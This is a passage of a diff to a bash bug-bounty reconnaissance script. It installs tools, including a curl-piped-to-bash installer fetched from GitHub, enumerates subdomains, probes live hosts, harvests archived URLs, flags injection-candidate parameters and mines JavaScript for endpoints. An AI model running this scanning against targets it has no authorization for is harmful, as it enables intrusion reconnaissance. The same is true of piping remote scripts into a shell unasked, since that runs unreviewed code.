+# ══════════════════════════════════════════════════════
+has()       { command -v "$1" &>/dev/null; }
+cnt()       { wc -l < "${1:-/dev/null}" 2>/dev/null || echo 0; }
+safe_name() { echo "$1" | md5sum | cut -c1-12; }
+
+# curl with optional cookie/proxy/headers
+_curl() {
+    local args=(-s --max-time "$TIMEOUT_CONN" --connect-timeout 5)
+    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
+    [[ -n "$PROXY_URL"      ]] && args+=(-x "$PROXY_URL")
+    for h in "${CUSTOM_HEADERS[@]:-}"; do
+        [[ -n "$h" ]] && args+=(-H "$h")
     done
-    find "$O" -name 'ffuf_*.json' -size +10c | xargs -r jq -r '.results[]?.input.FUZZ' {} 2>/dev/null | sort -u > "$O/hidden_params.txt" || true
-  fi
-  local TM=("0" "-1" "999999999999" "null" "undefined" "true" "false" "[]" "{}" "NaN" "Infinity" "%00")
-  if [[ -s "$W/urls/params.txt" ]]; then
-    head -25 "$W/urls/params.txt" | while IFS= read -r u; do
-      for m in "${TM[@]}"; do
-        local t; t=$(echo "$u" | qsreplace "$m" 2>/dev/null)
-        probe "$t"
-        if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "(stack trace|typeerror|valueerror|null pointer|parse error|invalid.*type|expected.*(number|integer))"; then
-          echo "MEDIUM|TYPE_CONFUSION|($m) $t" >> "$O/type_confusion.txt"
+    curl "${args[@]}" "$@"
+}
+
+# nuclei with optional cookie/proxy
+_nuclei() {
+    local args=()
+    [[ -n "$SESSION_COOKIE" ]] && args+=(-H "Cookie: $SESSION_COOKIE")
+    [[ -n "$PROXY_URL"      ]] && args+=(-proxy "$PROXY_URL")
+    for h in "${CUSTOM_HEADERS[@]:-}"; do
+        [[ -n "$h" ]] && args+=(-H "$h")
+    done
+    nuclei "${args[@]}" "$@"
+}
+
+# ffuf with optional cookie/proxy
+_ffuf() {
+    local args=()
+    [[ -n "$SESSION_COOKIE" ]] && args+=(-b "$SESSION_COOKIE")
+    [[ -n "$PROXY_URL"      ]] && args+=(-x "$PROXY_URL")
+    for h in "${CUSTOM_HEADERS[@]:-}"; do
+        [[ -n "$h" ]] && args+=(-H "$h")
+    done
+    ffuf "${args[@]}" "$@"
+}
+
+# ══════════════════════════════════════════════════════
+# WORKSPACE & RESUME
+# ══════════════════════════════════════════════════════
+setup_workspace() {
+    WORKSPACE="$HOME/bug-bounty/$(echo $DOMAIN | sed 's|https\?://||g' | sed 's|/$||g')"
+    mkdir -p "$WORKSPACE"/{subdomains,urls/gf,js/downloaded,paths,endpoints,params,\
+vulns/{xss,sqli,ssrf,lfi,csrf,cmdi,idor,nuclei,misconfig/graphql,param_fuzz},\
+classified/{idor,bac,oauth,upload,export,payment,webhook,admin,debug,burp_imports},\
+screenshots,reports,logs}
+
+    LOG_MASTER="$WORKSPACE/logs/master.log"
+    touch "$LOG_MASTER"
+
+    cat > "$WORKSPACE/scan_config.txt" << EOF
+TARGET=$DOMAIN
+DATE=$(date)
+VERSION=$VERSION
+MODE=$(if [[ "$F_DEEP" == true ]]; then echo DEEP; elif [[ "$F_QUICK" == true ]]; then echo QUICK; else echo FULL; fi)
+AUTH=$(if [[ -n "$SESSION_COOKIE" ]]; then echo AUTHENTICATED; else echo UNAUTHENTICATED; fi)
+PROXY=${PROXY_URL:-NONE}
+EOF
+
+    echo ""
+    echo -e "  ${BOLD}${WHITE}╔══════════════════════════════════════════════════╗${NC}"
+    echo -e "  ${BOLD}${WHITE}║  TARGET    : ${CYAN}${DOMAIN}${NC}"
+    echo -e "  ${BOLD}${WHITE}║  WORKSPACE : ${DIM}${WORKSPACE}${NC}"
+    echo -e "  ${BOLD}${WHITE}║  MODE      : ${YELLOW}$(if [[ "$F_DEEP" == true ]]; then echo "DEEP 🔥"; elif [[ "$F_QUICK" == true ]]; then echo "QUICK ⚡"; else echo "FULL 💀"; fi)${NC}"
+    [[ -n "$SESSION_COOKIE" ]] && echo -e "  ${BOLD}${WHITE}║  AUTH      : ${GREEN}Authenticated (cookie set)${NC}"
+    [[ -n "$PROXY_URL"      ]] && echo -e "  ${BOLD}${WHITE}║  PROXY     : ${GREEN}${PROXY_URL}${NC}"
+    echo -e "  ${BOLD}${WHITE}╚══════════════════════════════════════════════════╝${NC}"
+    echo ""
+}
+
+mark_done() { echo "$1" >> "$WORKSPACE/.done" 2>/dev/null || true; }
+is_done()   { [[ "$F_RESUME" == true ]] && grep -q "^$1$" "$WORKSPACE/.done" 2>/dev/null; }
+run_mod()   {
+    local name="$1"; shift
+    if is_done "$name"; then
+        log_info "SKIP: $name (resumed)"
+        return 0
+    fi
+    "$@"
+    mark_done "$name"
+}
+
+# ══════════════════════════════════════════════════════
+# PREFLIGHT — ensure minimal data exists for focused modes
+# ══════════════════════════════════════════════════════
+ensure_live() {
+    [[ -s "$WORKSPACE/subdomains/live_urls.txt" ]] && return
+    log_info "No live_urls.txt — running quick probe for $DOMAIN..."
+    {
+        echo "https://$DOMAIN"
+        subfinder -d "$DOMAIN" -silent 2>/dev/null \
+            | httpx -silent -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN"
+    } | sort -u > "$WORKSPACE/subdomains/live_urls.txt"
+    touch "$WORKSPACE/subdomains/status_200.txt" \
+          "$WORKSPACE/subdomains/status_403.txt" \
+          "$WORKSPACE/subdomains/tech_stack.txt"
+}
+
+ensure_urls() {
+    [[ -s "$WORKSPACE/urls/all_urls.txt" ]] && return
+    ensure_live
+    log_info "No URL data — quick collection for $DOMAIN..."
+    {
+        echo "$DOMAIN" | timeout 60 waybackurls 2>/dev/null
+        echo "$DOMAIN" | timeout 60 gau --threads 5 2>/dev/null
+    } | sort -u > "$WORKSPACE/urls/all_urls.txt"
+    grep -E '\?[a-zA-Z0-9_]+=.' "$WORKSPACE/urls/all_urls.txt" | sort -u \
+        > "$WORKSPACE/urls/urls_with_params.txt"
+    for p in xss sqli ssrf lfi redirect idor; do
+        gf "$p" "$WORKSPACE/urls/all_urls.txt" 2>/dev/null | sort -u \
+            > "$WORKSPACE/urls/gf/${p}.txt"
+    done
+    grep -oP 'https?://[^/]+\K(/[^?\s]*)?' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null \
+        | sort -u > "$WORKSPACE/endpoints/all_endpoints.txt"
+    touch "$WORKSPACE/endpoints/interesting_paths.txt"
+}
+
+# ══════════════════════════════════════════════════════
+# INSTALL TOOLS
+# ══════════════════════════════════════════════════════
+install_tools() {
+    log_step "INSTALLING ALL REQUIRED TOOLS"
+    export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
+    export GOPATH="$HOME/go"
+
+    log_info "Updating apt..."
+    sudo apt-get update -qq 2>/dev/null || true
+
+    local APT_PKGS=(python3 python3-pip curl wget git jq nmap sqlmap openssl)
+    for pkg in "${APT_PKGS[@]}"; do
+        has "$pkg" && { log_ok "$pkg ✓"; continue; }
+        log_info "Installing $pkg..."
+        sudo apt-get install -y -qq "$pkg" 2>/dev/null && log_ok "$pkg installed" || log_warn "$pkg failed"
+    done
+
+    # Go
+    if ! has go; then
+        log_info "Installing Go 1.22..."
+        wget -q "https://go.dev/dl/go1.22.0.linux-amd64.tar.gz" -O /tmp/go.tar.gz
+        sudo tar -C /usr/local -xzf /tmp/go.tar.gz
+        echo 'export PATH=$PATH:/usr/local/go/bin:$HOME/go/bin' >> ~/.bashrc
+        export PATH="$PATH:/usr/local/go/bin:$HOME/go/bin"
+    fi
+
+    local GO_PKGS=(
+        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest"
+        "github.com/projectdiscovery/httpx/cmd/httpx@latest"
+        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest"
+        "github.com/projectdiscovery/katana/cmd/katana@latest"
+        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest"
+        "github.com/projectdiscovery/alterx/cmd/alterx@latest"
+        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest"
+        "github.com/tomnomnom/waybackurls@latest"
+        "github.com/tomnomnom/gf@latest"
+        "github.com/tomnomnom/anew@latest"
+        "github.com/tomnomnom/qsreplace@latest"
+        "github.com/lc/gau/v2/cmd/gau@latest"
+        "github.com/hahwul/dalfox/v2@latest"
+        "github.com/hakluke/hakrawler@latest"
+        "github.com/ffuf/ffuf/v2@latest"
+        "github.com/003random/getJS@latest"
+        "github.com/owasp-amass/amass/v4/...@master"
+        "github.com/tomnomnom/assetfinder@latest"
+        "github.com/sensepost/gowitness@latest"
+    )
+    for pkg in "${GO_PKGS[@]}"; do
+        local name; name=$(basename "${pkg%@*}")
+        has "$name" && { log_ok "$name ✓"; continue; }
+        log_info "Installing $name..."
+        go install "$pkg" 2>/dev/null && log_ok "$name installed" || log_warn "$name failed"
+    done
+
+    local PIP_PKGS=(waymore uro arjun dirsearch wafw00f)
+    for pkg in "${PIP_PKGS[@]}"; do
+        pip3 show "$pkg" &>/dev/null && { log_ok "$pkg ✓"; continue; }
+        pip3 install -q "$pkg" --break-system-packages 2>/dev/null \
+            && log_ok "$pkg installed" || log_warn "$pkg failed"
+    done
+
+    # feroxbuster
+    has feroxbuster || {
+        curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh \
+            | bash -s /usr/local/bin 2>/dev/null \
+            && log_ok "feroxbuster installed"
+    }
+
+    # git-dumper
+    has git-dumper || {
+        pip3 install -q git-dumper --break-system-packages 2>/dev/null \
+            && log_ok "git-dumper installed"
+    }
+
+    # SecretFinder
+    [[ ! -f "$HOME/tools/SecretFinder/SecretFinder.py" ]] && {
+        mkdir -p "$HOME/tools"
+        git clone -q https://github.com/m4ll0k/SecretFinder.git "$HOME/tools/SecretFinder" 2>/dev/null
+        pip3 install -qr "$HOME/tools/SecretFinder/requirements.txt" --break-system-packages 2>/dev/null
+        log_ok "SecretFinder installed"
+    }
+
+    # LinkFinder
+    [[ ! -f "$HOME/tools/LinkFinder/linkfinder.py" ]] && {
+        git clone -q https://github.com/GerbenJavado/LinkFinder.git "$HOME/tools/LinkFinder" 2>/dev/null
+        pip3 install -qr "$HOME/tools/LinkFinder/requirements.txt" --break-system-packages 2>/dev/null
+        log_ok "LinkFinder installed"
+    }
+
+    # jwt_tool
+    [[ ! -f "$HOME/tools/jwt_tool/jwt_tool.py" ]] && {
+        git clone -q https://github.com/ticarpi/jwt_tool.git "$HOME/tools/jwt_tool" 2>/dev/null
+        pip3 install -qr "$HOME/tools/jwt_tool/requirements.txt" --break-system-packages 2>/dev/null
+        log_ok "jwt_tool installed"
+    }
+
+    # GF patterns
+    [[ ! -d "$HOME/.gf" ]] && {
+        mkdir -p ~/.gf
+        git clone -q https://github.com/1ndianl33t/Gf-Patterns.git /tmp/gfp 2>/dev/null
+        cp /tmp/gfp/*.json ~/.gf/ 2>/dev/null || true
+        git clone -q https://github.com/tomnomnom/gf.git /tmp/gfsrc 2>/dev/null
+        cp /tmp/gfsrc/examples/*.json ~/.gf/ 2>/dev/null || true
+        log_ok "GF patterns installed"
+    }
+
+    # nuclei templates
+    [[ ! -d "$HOME/nuclei-templates" ]] && nuclei -update-templates -silent 2>/dev/null \
+        && log_ok "Nuclei templates downloaded"
+
+    # SecLists
+    if [[ ! -f "/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt" ]]; then
+        log_info "Installing SecLists..."
+        sudo apt-get install -y -qq seclists 2>/dev/null \
+            || git clone -q --depth 1 https://github.com/danielmiessler/SecLists.git /usr/share/seclists 2>/dev/null
+        log_ok "SecLists installed"
+    fi
+
+    log_ok "All tools ready! Run: bug -d <domain>"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 01 — SUBDOMAIN ENUMERATION
+# ══════════════════════════════════════════════════════
+mod_subdomains() {
+    progress "MODULE 01 — Subdomain Enumeration"
+    log_section "MODULE 01 — SUBDOMAIN ENUMERATION"
+    local O="$WORKSPACE/subdomains"
+
+    log_info "subfinder (all sources, recursive)..."
+    subfinder -d "$DOMAIN" -silent -all -recursive -o "$O/subfinder.txt" 2>/dev/null || true
+    log_ok "subfinder: $(cnt "$O/subfinder.txt") subdomains"
+
+    log_info "crt.sh certificate transparency..."
+    _curl "https://crt.sh/?q=%25.${DOMAIN}&output=json" \
+        | jq -r '.[].name_value' 2>/dev/null \
+        | sed 's/\*\.//g' | sort -u > "$O/crtsh.txt" || true
+    log_ok "crt.sh: $(cnt "$O/crtsh.txt") subdomains"
+
+    log_info "assetfinder..."
+    assetfinder --subs-only "$DOMAIN" 2>/dev/null | sort -u > "$O/assetfinder.txt" || true
+
+    log_info "urlscan.io..."
+    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
+        | jq -r '.results[]?.page?.domain' 2>/dev/null \
+        | grep -F ".${DOMAIN}" | sort -u > "$O/urlscan_subs.txt" || true
+
+    _curl "https://api.hackertarget.com/hostsearch/?q=$DOMAIN" \
+        | cut -d',' -f1 | sort -u > "$O/hackertarget.txt" 2>/dev/null || true
+
+    _curl "https://rapiddns.io/subdomain/$DOMAIN?full=1" 2>/dev/null \
+        | grep -oE "[a-zA-Z0-9._-]+\.${DOMAIN}" | sort -u > "$O/rapiddns.txt" || true
+
+    _curl "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=$DOMAIN" \
+        | jq -r '.subdomains[]?' 2>/dev/null | sort -u > "$O/threatcrowd.txt" || true
+
+    if [[ -n "${PDCP_API_KEY:-}" ]]; then
+        chaos -d "$DOMAIN" -silent -key "$PDCP_API_KEY" 2>/dev/null \
+            | sort -u > "$O/chaos.txt" || true
+        log_ok "chaos: $(cnt "$O/chaos.txt")"
+    fi
+
+    if [[ "$F_QUICK" == false ]]; then
+        log_info "amass passive (2 min cap)..."
+        timeout 120 amass enum -passive -d "$DOMAIN" -o "$O/amass.txt" -silent 2>/dev/null || true
+        log_ok "amass: $(cnt "$O/amass.txt")"
+
+        log_info "alterx permutation expansion..."
+        cat "$O/subfinder.txt" 2>/dev/null \
+            | alterx -silent 2>/dev/null \
+            | head -5000 | sort -u > "$O/alterx.txt" || true
+        log_ok "alterx: $(cnt "$O/alterx.txt") candidates"
+    fi
+
+    # Merge & validate — dedup enforced
+    cat "$O"/*.txt 2>/dev/null \
+        | sort -u \
+        | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9._-]*)\.${DOMAIN}$" \
+        > "$O/all_subdomains.txt" || true
+    log_ok "Total unique subdomains: $(cnt "$O/all_subdomains.txt")"
+
+    log_info "DNS resolution via dnsx..."
+    cat "$O/all_subdomains.txt" \
+        | dnsx -silent -a -cname -resp -o "$O/resolved_full.txt" 2>/dev/null || true
+    awk '{print $1}' "$O/resolved_full.txt" 2>/dev/null > "$O/resolved_domains.txt"
+    sort -u -o "$O/resolved_domains.txt" "$O/resolved_domains.txt" 2>/dev/null || true
+    log_ok "Resolved: $(cnt "$O/resolved_domains.txt") live subdomains"
+
+    local wc_ip; wc_ip=$(dig "randomx99nomatch.$DOMAIN" A +short 2>/dev/null | head -1 || true)
+    [[ -n "$wc_ip" ]] && log_warn "Wildcard DNS detected: $wc_ip — expect false positives"
+
+    grep -iE "(github\.io|heroku|amazonaws|cloudfront|azurewebsites|netlify|surge\.sh|bitbucket\.io|fastly)" \
+        "$O/resolved_full.txt" 2>/dev/null | sort -u > "$O/takeover_candidates.txt" || true
+    [[ -s "$O/takeover_candidates.txt" ]] && \
+        log_warn "Potential takeover candidates: $(cnt "$O/takeover_candidates.txt")"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 02 — LIVE HOST PROBING
+# ══════════════════════════════════════════════════════
+mod_httpx() {
+    progress "MODULE 02 — Live Host Probing"
+    log_section "MODULE 02 — LIVE HOST PROBING (httpx)"
+    local O="$WORKSPACE/subdomains"
+
+    if [[ "$M_ONE" == true ]]; then
+        echo "https://$DOMAIN" > "$O/live_urls.txt"
+        echo "https://$DOMAIN" > "$O/status_200.txt"
+        touch "$O/status_403.txt" "$O/status_401.txt" "$O/tech_stack.txt"
+        log_ok "-one mode: single target https://$DOMAIN"
+        return
+    fi
+
+    log_info "httpx full fingerprint (threads: $T_HTTPX)..."
+    {
+        cat "$O/resolved_domains.txt" "$O/all_subdomains.txt" 2>/dev/null
+        echo "$DOMAIN"
+    } | sort -u | httpx -silent \
+        -status-code -title -tech-detect \
+        -content-length -web-server -ip -cname -cdn \
+        -ports 80,443,8080,8443,8888,8000,3000,4000,5000,9000,9443 \
+        -threads "$T_HTTPX" -timeout "$TIMEOUT_CONN" \
+        -follow-redirects \
+        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
+        ${PROXY_URL:+-http-proxy "$PROXY_URL"} \
+        -json -o "$O/live_hosts.json" 2>/dev/null || true
+
+    jq -r '.url' "$O/live_hosts.json" 2>/dev/null | sort -u > "$O/live_urls.txt"
+    log_ok "Live hosts: $(cnt "$O/live_urls.txt")"
+
+    for code in 200 301 302 401 403 404 500; do
+        jq -r "select(.status_code==$code) | .url" "$O/live_hosts.json" 2>/dev/null \
+            | sort -u > "$O/status_${code}.txt" || true
+    done
+    log_ok "200:$(cnt "$O/status_200.txt") | 403:$(cnt "$O/status_403.txt") | 401:$(cnt "$O/status_401.txt") | 500:$(cnt "$O/status_500.txt")"
+
+    cp "$O/status_403.txt" "$WORKSPACE/paths/403_targets.txt" 2>/dev/null || true
+
+    jq -r '.tech[]?' "$O/live_hosts.json" 2>/dev/null \
+        | sort | uniq -c | sort -rn | head -40 > "$O/tech_stack.txt"
+    log_ok "Tech stack fingerprinted: $(cnt "$O/tech_stack.txt") entries"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 03 — URL COLLECTION
+# ══════════════════════════════════════════════════════
+mod_urls() {
+    progress "MODULE 03 — URL Collection"
+    log_section "MODULE 03 — URL COLLECTION (ALL SOURCES)"
+    local O="$WORKSPACE/urls"
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+
+    log_info "waybackurls (main + top ${MAX_SUBS_WB} subs)..."
+    timeout 120 bash -c "echo '$DOMAIN' | waybackurls 2>/dev/null" | sort -u > "$O/wayback.txt" || true
+    head -"$MAX_SUBS_WB" "$WORKSPACE/subdomains/resolved_domains.txt" 2>/dev/null \
+        | while read -r sub; do
+            timeout 25 bash -c "echo '$sub' | waybackurls 2>/dev/null" 2>/dev/null || true
+          done | sort -u >> "$O/wayback.txt" || true
+    sort -u -o "$O/wayback.txt" "$O/wayback.txt"
+    log_ok "wayback: $(cnt "$O/wayback.txt") URLs"
+
+    log_info "gau (AlienVault + URLScan + Wayback)..."
+    timeout 180 gau --subs --threads 10 --timeout 10 \
+        --blacklist "png,jpg,gif,ico,svg,woff,woff2,ttf,eot,css,mp4,zip" \
+        "$DOMAIN" 2>/dev/null | sort -u > "$O/gau.txt" || true
+    log_ok "gau: $(cnt "$O/gau.txt") URLs"
+
+    log_info "waymore (180s cap)..."
+    timeout 180 waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" --timeout 30 2>/dev/null \
+        || timeout 180 python3 -m waymore -i "$DOMAIN" -mode U -oU "$O/waymore.txt" 2>/dev/null \
+        || true
+    log_ok "waymore: $(cnt "$O/waymore.txt") URLs"
+
+    _curl "https://urlscan.io/api/v1/search/?q=domain:${DOMAIN}&size=10000" \
+        | jq -r '.results[]?.page?.url' 2>/dev/null | sort -u > "$O/urlscan.txt" || true
+    log_ok "urlscan.io: $(cnt "$O/urlscan.txt") URLs"
+
+    log_info "katana standard crawl..."
+    timeout 120 katana -u "https://$DOMAIN" -jc -kf all \
+        -d "$D_KATANA" -timeout 10 -c "$T_KATANA" \
+        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
+        -silent -o "$O/katana_single.txt" 2>/dev/null || true
+
+    log_info "katana list crawl (all live hosts)..."
+    timeout 600 katana -list "$LIVE" -jc -kf all \
+        -d "$D_KATANA" -timeout 10 -c "$T_KATANA" -p 20 \
+        ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
+        -silent -o "$O/katana_list.txt" 2>/dev/null || log_warn "katana list timed out"
+
+    log_info "katana headless (JS-heavy)..."
+    timeout 180 katana -u "https://$DOMAIN" -headless -jc -kf all \
+        -d 2 -timeout 15 -c 20 \
+        -silent -o "$O/katana_headless.txt" 2>/dev/null || true
+
+    cat "$O/katana_single.txt" "$O/katana_list.txt" "$O/katana_headless.txt" \
+        2>/dev/null | sort -u > "$O/katana.txt"
+    log_ok "katana total: $(cnt "$O/katana.txt") URLs"
+
+    log_info "hakrawler (300s cap)..."
+    timeout 300 bash -c \
+        "cat '$LIVE' | hakrawler -depth 2 -subs -u 2>/dev/null | sort -u > '$O/hakrawler.txt'" \
+        || log_warn "hakrawler timed out"
+
+    # Merge & dedup
+    cat "$O"/*.txt 2>/dev/null | sort -u > "$O/all_urls_raw.txt"
+    log_ok "Raw total: $(cnt "$O/all_urls_raw.txt") URLs"
+
+    if has uro; then
+        uro < "$O/all_urls_raw.txt" 2>/dev/null > "$O/all_urls.txt" || cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
+    else
+        cp "$O/all_urls_raw.txt" "$O/all_urls.txt"
+    fi
+    sort -u -o "$O/all_urls.txt" "$O/all_urls.txt" 2>/dev/null || true
+    log_ok "Deduplicated: $(cnt "$O/all_urls.txt") URLs"
+
+    log_info "GF pattern extraction..."
+    local GF_PATTERNS=(xss sqli ssrf redirect lfi rce idor interestingparams interestingEXT)
+    for p in "${GF_PATTERNS[@]}"; do
+        gf "$p" "$O/all_urls.txt" 2>/dev/null | sort -u > "$O/gf/${p}.txt" || true
+        local c; c=$(cnt "$O/gf/${p}.txt")
+        [[ $c -gt 0 ]] && log_ok "gf[$p]: $c URLs"
+    done
+
+    # ── Parameter-focused URL filtering (drop pure crawler noise) ──────────
+    log_info "Filtering URLs to parameter/input/dynamic targets only..."
+
+    grep -E '\?[a-zA-Z0-9_%-]+=' "$O/all_urls.txt" | sort -u > "$O/urls_with_params.txt"
+
+    grep -iE '[?&](id|uid|user|username|email|name|q|query|search|s|key|token|ref|redirect|url|path|file|page|lang|cat|category|type|action|cmd|exec|input|data|val|value|param|p|t|n|m|v|c|i)=[^\&]+' \
+        "$O/all_urls.txt" | sort -u > "$O/urls_user_input.txt"
+
+    grep -iE '(/api/|/ajax/|/json|/render|/view|/fetch|/graphql|/rpc|/query|format=json|format=xml|callback=|jsonp=|\.json\?|\.xml\?)' \
+        "$O/all_urls.txt" | sort -u > "$O/urls_dynamic.txt"
+
+    grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
+        | sed 's/^[?&]//;s/=//' | sort -u > "$WORKSPACE/params/all_params.txt"
+
+    {
+        echo "=== ID / Object Reference ==="
+        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
+            | grep -iE '(id|uid|oid|rid|cid|pid|sid|uuid|guid|ref|token|key|code|hash)=' \
+            | sed 's/^[?&]//;s/=//' | sort -u
+        echo ""
+        echo "=== Search / Query ==="
+        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
+            | grep -iE '(q|query|s|search|term|keyword|find|filter|sort|order)=' \
+            | sed 's/^[?&]//;s/=//' | sort -u
+        echo ""
+        echo "=== User / Auth ==="
+        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
+            | grep -iE '(user|username|email|login|auth|session|pass|account|member|role|admin)=' \
+            | sed 's/^[?&]//;s/=//' | sort -u
+        echo ""
+        echo "=== Navigation / Path ==="
+        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
+            | grep -iE '(url|redirect|return|next|goto|path|file|dir|page|lang|locale|cat|category|section|tab|view|action|type|format|mode)=' \
+            | sed 's/^[?&]//;s/=//' | sort -u
+        echo ""
+        echo "=== Injection Candidates ==="
+        grep -oP '[?&][a-zA-Z0-9_%-]+=' "$O/urls_with_params.txt" \
+            | grep -iE '(cmd|exec|command|input|data|val|value|param|debug|test|payload|template|tpl|include|load|import|src|source)=' \
+            | sed 's/^[?&]//;s/=//' | sort -u
+    } > "$WORKSPACE/params/params_by_type.txt"
+
+    log_ok "URLs with params    : $(cnt "$O/urls_with_params.txt")"
+    log_ok "URLs with user input: $(cnt "$O/urls_user_input.txt")"
+    log_ok "URLs dynamic/API    : $(cnt "$O/urls_dynamic.txt")"
+    log_ok "Unique param names  : $(cnt "$WORKSPACE/params/all_params.txt")"
+}
+
+# ══════════════════════════════════════════════════════
+# MODULE 04 — JS ANALYSIS (CLEAN ENDPOINT MINING, NO NOISE)
+# ══════════════════════════════════════════════════════
+mod_js() {
+    progress "MODULE 04 — JavaScript Analysis"
+    log_section "MODULE 04 — JAVASCRIPT ANALYSIS (CLEAN ENDPOINT MINING)"
+    local O="$WORKSPACE/js"
+    local LIVE="$WORKSPACE/subdomains/live_urls.txt"
+    mkdir -p "$O/downloaded"
+
+    # ── 1. Collect JS URLs — unique, target-scoped only ──
+    {
+        grep -E '\.js(\?|$)' "$WORKSPACE/urls/all_urls.txt" 2>/dev/null
+        while IFS= read -r url; do
+            has getJS && getJS --url "$url" --complete 2>/dev/null | grep -E '\.js(\?|$)'
+        done < "$LIVE"
+        grep -E '\.js(\?|$)' "$WORKSPACE/urls/katana.txt" "$WORKSPACE/urls/hakrawler.txt" 2>/dev/null
+    } | grep -iE "${DOMAIN}" | sort -u > "$O/js_urls.txt" || true
+    log_ok "JS files: $(cnt "$O/js_urls.txt") (target-scoped)"
+
+    # ── 2. Parallel download — native curl, no external helper ──
+    log_info "Downloading JS (parallel, cap 200)..."
+    local n=0
+    while IFS= read -r url && [[ $n -lt 200 ]]; do
+        local fname; fname="$O/downloaded/$(safe_name "$url").js"
+        [[ -s "$fname" ]] && { n=$((n+1)); continue; }
+        _curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
+              "$url" -o "$fname" 2>/dev/null &
+        n=$((n+1))
+        (( n % 20 == 0 )) && { wait 2>/dev/null || true; }
+    done < "$O/js_urls.txt"
+    wait 2>/dev/null || true
+    # Drop junk: empty/tiny files + HTML error pages disguised as .js
+    find "$O/downloaded" -name "*.js" -size -100c -delete 2>/dev/null || true
+    for f in "$O/downloaded"/*.js; do
+        [[ -f "$f" ]] || continue
+        head -c 300 "$f" 2>/dev/null | grep -qiE '<!doctype html|<html|<error' && rm -f "$f"
+    done
+    log_ok "Downloaded: $(ls "$O/downloaded/"*.js 2>/dev/null | wc -l) files"
+
+    # ── 3. Endpoint harvest → noise filter → unique ──
+    local JS_TMP="$O/.js_all.tmp"
+    find "$O/downloaded" -name "*.js" -type f -exec cat {} + > "$JS_TMP" 2>/dev/null || true
+    local SQ="'" DQ='"'
+    log_info "Mining endpoints (noise-filtered)..."
+    if [[ -s "$JS_TMP" ]]; then
+        {
+            # full URLs
+            grep -oE 'https?://[a-zA-Z0-9._~:/?#\[\]@!$&()*+,;=%-]+' "$JS_TMP"
+            # quoted relative API-ish paths (single/double quotes)
+            grep -oE "[${SQ}${DQ}](api|v[0-9]|admin|auth|user|account|config|internal|graphql|rest|service|backend|webhook|oauth|sso|upload|export|import|download)/[a-zA-Z0-9._/{}?=&%:-]*[${SQ}${DQ}]" "$JS_TMP"
+            # fetch/axios/XHR/open calls
+            grep -oE "(fetch|axios|XMLHttpRequest|open)\([${SQ}${DQ}/][a-zA-Z0-9_./?=&%-]+" "$JS_TMP"
+            # http verb helpers: get( "/x" ) post( "/y" )
+            grep -oE "(get|post|put|delete|patch)\([${SQ}${DQ}/][a-zA-Z0-9_./?=&%-]+" "$JS_TMP"
+            # url:/endpoint: assignments
+            grep -oE "url[[:space:]]*[:=][[:space:]]*[${SQ}${DQ}]/[a-zA-Z0-9_./?=&%-]+" "$JS_TMP" | grep -oE '/[a-zA-Z0-9_./?=&%-]+'
+            # string concatenation → route with dynamic segment
+            grep -oE "${DQ}[a-zA-Z0-9_./-]{3,}${DQ}[[:space:]]*\+" "$JS_TMP" \
+                | sed -E -e 's/^"//' -e 's/"[[:space:]]*\+$//' -e 's|$|/{param}|'
+        } \
+        | sed -e "s/[\"']//g" -e 's/^\.\///' -e 's/\\\//g' \
+        | tr -d '`' \
+        | grep -vE '\.(js|css|png|jpe?g|gif|svg|ico|woff2?|ttf|eot|otf|map|mp[34]|webm|avi|mov|zip|tar\.?g?z|gz|pdf|docx?|xlsx?|pptx?|min\.js)(\?|$)' \
+        | grep -vE '/(static|assets?|images?|img|icons?|fonts?|media|videos?|node_modules|bower_components|vendor|dist|build|public|__webpack|\.well-known)(/|$)' \
+        | grep -vE '^(https?:)?//(fonts\.googleapis|fonts\.gstatic|ajax\.googleapis|cdnjs|unpkg|jsdelivr|code\.jquery|cloudflare|google-analytics|googletagmanager|doubleclick|facebook|fbcdn|twitter|youtube|w3\.org|schema\.org|example\.com|localhost|127\.0\.0\.1)(/|$)' \
+        | grep -vE '^(data:|chrome|javascript:|mailto:|tel:|blob:)' \
+        | grep -vE '(sourceMappingURL|webpack|__webpack_require__|hot-update|manifest\.json|service-worker|favicon|robots\.txt|sitemap\.xml)' \
+        | grep -vE '^/[0-9a-f]{20,}' \
+        | grep -vE '^$' \
+        | sort -u > "$O/js_endpoints_raw.txt"
+        log_ok "Raw endpoints (filtered): $(cnt "$O/js_endpoints_raw.txt")"
+    else
+        touch "$O/js_endpoints_raw.txt"
+    fi
+
+    # ── 4. Clean API route table (≥2 segments, real API keywords, no query junk) ──
+    grep -E '^/' "$O/js_endpoints_raw.txt" 2>/dev/null \
+        | sed 's/?.*$//; s#/$##' \
+        | awk -F/ 'NF>=3 && $2!=""' \
